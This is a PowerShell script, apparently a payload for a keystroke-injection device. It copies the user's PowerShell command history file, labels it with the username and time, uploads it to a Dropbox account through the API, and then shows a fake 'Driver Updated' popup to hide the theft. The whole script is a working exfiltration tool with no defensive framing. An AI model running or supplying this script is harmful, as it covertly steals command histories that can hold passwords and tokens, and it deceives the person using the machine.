#Powershell-History

# See if file is a thing
Test-Path -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -PathType Leaf

#If the file does not exist, write to host.
if (-not(Test-Path -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -PathType Leaf)) {
     try {
         Write-Host "The Powershell History file has not been found. "
     }
     catch {
         throw $_.Exception.Message
     }
 }
 # Copy Powershell History to Temp Directory to get sent to Dropbox
  else {
     $F1 = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_ps_history.txt"
     Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination "$env:tmp/$F1" 
 }


function DropBox-Upload {

    [CmdletBinding()]
    param (
        
    [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
    [Alias("f")]
    [string]$SourceFilePath
    ) 
    $DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"   # Replace with your DropBox Access Token
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $DropBoxAccessToken
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
    }

DropBox-Upload -f "$env:tmp/$F1"

$done = New-Object -ComObject Wscript.Shell;$done.Popup("Driver Updated",1)
